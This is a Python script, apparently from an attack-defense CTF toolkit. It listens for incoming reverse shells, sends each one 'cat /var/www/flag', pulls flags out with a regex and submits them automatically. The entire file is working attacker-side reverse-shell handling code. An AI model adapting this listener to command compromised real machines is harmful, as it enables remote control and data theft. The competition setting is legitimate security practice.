import socket
import re
import time
import logging
import threading
import json
import coloredlogs
import question_solver

with open('config.json', 'r') as f:
    config = json.loads(f.read())
MATCH_FLAG = config['globals']['flag_match']
LISTEN_PORT = config['globals']['revsh_listen_port']
log = logging.getLogger(__name__)
coloredlogs.install(
    level='DEBUG',
    logger=log,
    fmt='%(asctime)s [%(process)d-%(filename)s] %(levelname)s %(message)s'
)
log.addHandler(logging.FileHandler(
    'logs/reverseshell.log'
))

flag_pool = []
stop_thread = False


def createSocket():
    log.info('开启反弹shell监听')
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        log.info("create socket succ")

        sock.bind(('0.0.0.0', LISTEN_PORT))
        sock.settimeout(10)
        sock.listen(5)
        log.info(f"started listening on port {LISTEN_PORT}")

    except:
        log.error("init socket err!")

    while stop_thread == False:
        log.info("waiting for connection...")
        try:
            conn, addr = sock.accept()
        except:
            continue
        log.info("connection established with:")
        log.info(addr)
        conn.settimeout(5)
        flagbuff = conn.recv(1024)
        log.debug(flagbuff)
        conn.send('cat /var/www/flag')
        conn.send('\n')
        time.sleep(1)
        flags = conn.recv(1024)
        for flag in re.findall(MATCH_FLAG, flags):
            question_solver.check_submit(flag, '反弹shell')
            log.info("received flag"+flag)
        conn.send('exit\n')
    log.info('已停止反弹shell监听')


if __name__ == '__main__':
    try:
        createSocket()
    except KeyboardInterrupt:
        stop_thread = True
